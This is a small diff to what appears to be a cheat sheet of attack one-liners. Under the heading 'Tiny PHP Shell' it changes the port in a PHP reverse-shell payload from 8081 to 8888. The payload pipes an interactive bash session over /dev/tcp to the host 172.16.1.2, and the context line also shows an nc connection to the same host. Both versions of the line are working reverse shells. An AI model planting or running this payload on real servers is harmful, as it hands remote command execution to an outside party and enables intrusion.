@@ -13,7 +13,7 @@ nc 172.16.1.2 443
 
 # Tiny PHP Shell
 
-<?php exec("/bin/bash -c 'bash -i > &/dev/tcp/172.16.1.2/8081 0>&1'"); ?>
+<?php exec("/bin/bash -c 'bash -i > &/dev/tcp/172.16.1.2/8888 0>&1'"); ?>
 
 
 
